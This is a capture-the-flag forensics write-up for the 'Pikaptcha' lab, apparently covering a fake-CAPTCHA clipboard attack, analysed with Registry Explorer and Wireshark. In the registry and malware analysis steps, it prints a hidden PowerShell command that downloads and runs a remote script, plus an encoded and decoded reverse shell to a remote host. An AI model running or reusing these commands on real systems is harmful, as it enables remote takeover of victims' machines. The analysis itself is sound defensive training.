# Pikaptcha

## Challenge Information
- **Challenge Name**: Pikaptcha
- **Category**: Digital Forensics
- **Difficulty Level**: Easy

## Required Tools
To complete the lab, we needed Registry Explorer to analyze the logs of the nat and log files. Moreover, needed Wireshark to analyze the pcapng file. If you are using Windows, you need to download the second tool only, first one is already available. If you are using Kali, you need to download the first one.

### Setting up Registry Explorer
1. Go to `https://ericzimmerman.github.io/#!index.md` and download `Registry Explorer`
2. Unzip the file and run the exe to complete the installation
3. Install `windowsdesktop-runtime-6.0.36-win-x64`, run its exe to complete its installation as well
4. This allows you to run the Windows applications on Linux
5. Make sure that you have `wine` installed on your Linux
6. Run the command in the directory where this exe is present:
```bash
wine RegistryExplorer.exe
```

## Investigation Steps

1. Registry Analysis:
   - Open the `NTUSER.DAT` file in the Registry Explorer which will create `NTUSER.DAT_clean` file
   - This file contains information of the complete logs and what happened in the system when the attack happened
   - You can see two main tabs: `Registry hives` and `Available bookmarks`
   - Click on the second one
   - Scroll down to find a directory named `RunMRU`
   - Here you will see the malicious executable:
   ```powershell
   powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://43.205.115.44/office2024install.ps1')"
   ```

2. Timestamp Analysis:
   - Very next to the above flag, there is the UTC time when this was installed: `2024-09-23 05:07:45`

3. Network Analysis:
   - From part-1, we found the installation URL: `http://43.205.115.44/office2024install.ps1`
   - Open the pcapng file and add a filter: `ip.addr== 43.205.115.44`
   - Follow the stream to find an encoded PowerShell command:
   ```powershell
   powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIANAAzAC4AMgAwADUALgAxADEANQAuADQANAAiACwANgA5ADYAOQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
   ```
   
   To get the installed file:
   1. Go to File->Export Objects->HTTP
   2. Add a filter `office2024`
   3. Download the ps1 file
   4. Calculate SHA256 hash using PowerShell:
   ```powershell
   Get-FileHash -Path ". office2024install.ps1" -Algorithm SHA256
   ```
   This will output the hash: `579284442094E1A44BEA9CFB7D8D794C8977714F827C97BCB2822A97742914DE`

4. Malware Analysis:
   - Decode the base64 from step 3 to reveal the original shell code and identify the port number. The decoding will give the following shell code:
```bash
$client = New-Object System.Net.Sockets.TCPClient("43.205.115.44",6969); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535 | %{0}; while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i); $sendback = (iex $data 2>&1 | Out-String); $sendback2 = $sendback + "PS " + (pwd).Path + "> "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush(); }; $client.Close();
```

5. Network Traffic Duration:
   - Using filter `ip.addr== 43.205.115.44`
   - Go to the last packet in the pcapng file
   - Navigate to `Transmission Control Protocol`
   - Check `Timestamps`
   - Total conversation time: `403` seconds

6. Web Traffic Analysis:
   - Using filter `ip.addr== 43.205.115.44`
   - Look for successful GET request (200 status code)
   - Response type: `text/html`
   - Follow the stream to find the HTML file
   - In the JavaScript section, locate function `stageClipboard` responsible for the malicious payload
